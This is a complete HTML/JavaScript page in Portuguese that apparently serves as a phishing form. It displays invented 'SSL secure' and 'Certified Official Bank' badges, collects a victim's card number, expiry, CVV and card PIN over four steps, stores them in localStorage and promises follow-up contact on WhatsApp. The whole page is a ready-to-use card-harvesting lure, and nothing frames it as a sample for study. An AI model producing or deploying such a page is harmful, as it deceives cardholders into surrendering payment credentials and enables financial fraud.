<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulário Seguro</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #f0f2f5 0%, #dde6f8 100%);
      min-height: 100vh;
    }
    .selo {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      font-size: 0.95rem;
      font-weight: 600;
      color: #059669;
      background: #d1fae5;
      border-radius: 0.75rem;
      padding: 0.25rem 0.75rem;
      margin-bottom: 1rem;
      width: fit-content;
      box-shadow: 0 1px 3px rgba(16,185,129,0.08);
    }
    .input-shadow {
      box-shadow: 0 2px 8px rgba(59,130,246,0.11);
    }
  </style>
</head>
<body>
  <div class="flex items-center justify-center min-h-screen">
    <div class="w-full max-w-md bg-white rounded-2xl shadow-xl px-8 py-8">
      <div class="flex flex-col items-center mb-7">
        <span class="selo">
          <svg height="18" width="18" fill="none" stroke="#059669" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M8 12l2 2 4-4"/></svg>
          SSL Seguro & Protegido
        </span>
        <span class="selo" style="background:#fef3c7; color:#b45309; box-shadow:0 1px 4px #fde68a40;">
          <svg height="18" width="18" fill="none" stroke="#b45309" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="6" width="18" height="12" rx="3"/><path d="M7 6v-2a2 2 0 012-2h6a2 2 0 012 2v2"/></svg>
          Banco Oficial Certificado
        </span>
        <h1 class="text-2xl font-bold text-gray-800 mt-2 mb-1">Formulário Seguro</h1>
        <p class="text-gray-500 text-sm mb-1">Preencha os dados para continuar</p>
      </div>

      <form id="multiStepForm" autocomplete="off">
        <!-- Etapa 1: Cartão -->
        <div id="step1">
          <label class="block text-gray-700 font-medium mb-1 text-left" for="cartao">Número do Cartão</label>
          <input
            id="cartao"
            name="cartao"
            class="input-shadow w-full px-4 py-3 border rounded-lg text-lg mb-2 focus:ring-2 focus:ring-blue-400 outline-none"
            placeholder="1234 5678 9012 3456"
            maxlength="19"
            inputmode="numeric"
            autocomplete="off"
            required
          >
          <div id="msgCartao" class="text-red-500 text-sm h-4 mb-3"></div>
          <button type="button" id="next1" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg py-2 mt-1 shadow transition">Continuar</button>
        </div>

        <!-- Etapa 2: Validade -->
        <div id="step2" class="hidden">
          <label class="block text-gray-700 font-medium mb-1 text-left" for="validade">Validade</label>
          <input
            id="validade"
            name="validade"
            class="input-shadow w-full px-4 py-3 border rounded-lg text-lg mb-2 focus:ring-2 focus:ring-blue-400 outline-none"
            placeholder="MM/AA"
            maxlength="5"
            inputmode="numeric"
            autocomplete="off"
            required
          >
          <div id="msgValidade" class="text-red-500 text-sm h-4 mb-3"></div>
          <button type="button" id="next2" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg py-2 mt-1 shadow transition">Continuar</button>
        </div>

        <!-- Etapa 3: CVV -->
        <div id="step3" class="hidden">
          <label class="block text-gray-700 font-medium mb-1 text-left" for="cvv">CVV</label>
          <input
            id="cvv"
            name="cvv"
            class="input-shadow w-full px-4 py-3 border rounded-lg text-lg mb-2 focus:ring-2 focus:ring-blue-400 outline-none"
            placeholder="Ex: 123"
            maxlength="3"
            inputmode="numeric"
            autocomplete="off"
            required
          >
          <div id="msgCVV" class="text-red-500 text-sm h-4 mb-3"></div>
          <button type="button" id="next3" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg py-2 mt-1 shadow transition">Continuar</button>
        </div>

        <!-- Etapa 4: Senha/PIN -->
        <div id="step4" class="hidden">
          <label class="block text-gray-700 font-medium mb-1 text-left" for="pin">Senha/PIN (4 a 8 dígitos)</label>
          <input
            id="pin"
            name="pin"
            type="password"
            class="input-shadow w-full px-4 py-3 border rounded-lg text-lg mb-2 focus:ring-2 focus:ring-blue-400 outline-none"
            placeholder="****"
            maxlength="8"
            inputmode="numeric"
            autocomplete="off"
            required
          >
          <div id="msgPIN" class="text-red-500 text-sm h-4 mb-3"></div>
          <button type="submit" id="enviar" class="w-full bg-green-600 hover:bg-green-700 text-white font-semibold rounded-lg py-2 mt-1 shadow transition">Enviar</button>
        </div>
      </form>

      <div id="successMsg" class="hidden mt-8 flex flex-col items-center">
        <svg width="48" height="48" fill="none" stroke="#059669" stroke-width="2.5" viewBox="0 0 24 24" class="mb-2">
          <circle cx="12" cy="12" r="10"/>
          <path d="M8 12l2 2 4-4"/>
        </svg>
        <h3 class="text-lg font-bold text-gray-700 mb-2">Seus dados foram enviados!</h3>
        <p class="text-gray-600 mb-3 text-center">Aguarde contato via WhatsApp.<br>Sua segurança está garantida.</p>
      </div>
    </div>
  </div>
  <script>
    // Máscara cartão: formata como 1234 5678 9012 3456
    function formatCardNumber(input) {
      input = input.replace(/\D/g, '').slice(0,16);
      return input.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
    }

    document.getElementById('cartao').addEventListener('input', function() {
      this.value = formatCardNumber(this.value);
    });

    // Máscara validade: MM/AA
    document.getElementById('validade').addEventListener('input', function() {
      let v = this.value.replace(/\D/g, '').slice(0,4);
      if(v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2,4);
      this.value = v;
    });

    // Passos
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const step3 = document.getElementById('step3');
    const step4 = document.getElementById('step4');
    const successMsg = document.getElementById('successMsg');

    // Mensagens
    const msgCartao = document.getElementById('msgCartao');
    const msgValidade = document.getElementById('msgValidade');
    const msgCVV = document.getElementById('msgCVV');
    const msgPIN = document.getElementById('msgPIN');

    let data = {};

    // Etapa 1
    document.getElementById('next1').onclick = function() {
      let cartao = document.getElementById('cartao').value.replace(/\s/g, '');
      if (/^\d{16}$/.test(cartao)) {
        msgCartao.textContent = '';
        data.cartao = cartao;
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
        document.getElementById('validade').focus();
      } else {
        msgCartao.textContent = 'Digite 16 dígitos numéricos válidos.';
      }
    };

    // Etapa 2
    document.getElementById('next2').onclick = function() {
      let val = document.getElementById('validade').value;
      if (/^(0[1-9]|1[0-2])\/\d{2}$/.test(val)) {
        msgValidade.textContent = '';
        data.validade = val;
        step2.classList.add('hidden');
        step3.classList.remove('hidden');
        document.getElementById('cvv').focus();
      } else {
        msgValidade.textContent = 'Digite no formato MM/AA (ex: 09/27).';
      }
    };

    // Etapa 3
    document.getElementById('next3').onclick = function() {
      let cvv = document.getElementById('cvv').value;
      if (/^\d{3}$/.test(cvv)) {
        msgCVV.textContent = '';
        data.cvv = cvv;
        step3.classList.add('hidden');
        step4.classList.remove('hidden');
        document.getElementById('pin').focus();
      } else {
        msgCVV.textContent = 'Digite exatamente 3 dígitos.';
      }
    };

    // Etapa 4 (envio)
    document.getElementById('multiStepForm').onsubmit = function(e) {
      e.preventDefault();
      let pin = document.getElementById('pin').value;
      if (/^\d{4,8}$/.test(pin)) {
        msgPIN.textContent = '';
        data.pin = pin;
        data.hora = new Date().toLocaleString();

        // Recupera do localStorage
        let envios = JSON.parse(localStorage.getItem('envios')) || [];
        envios.push(data);
        localStorage.setItem('envios', JSON.stringify(envios));

        // Esconde formulário e mostra sucesso
        this.classList.add('hidden');
        successMsg.classList.remove('hidden');
      } else {
        msgPIN.textContent = 'Digite de 4 a 8 dígitos numéricos.';
      }
    };
  </script>
</body>
</html>
